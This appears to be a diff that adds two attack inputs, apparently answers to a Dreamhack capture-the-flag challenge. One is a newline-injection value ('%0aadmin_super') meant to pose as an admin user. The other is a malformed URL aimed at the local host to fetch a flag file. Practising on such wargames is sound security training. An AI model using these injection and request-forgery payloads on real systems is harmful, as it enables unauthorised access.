@@ -1,0 +1,3 @@
+%0aadmin_super
+
+http@0/dreamhack.io/{.}./flag#
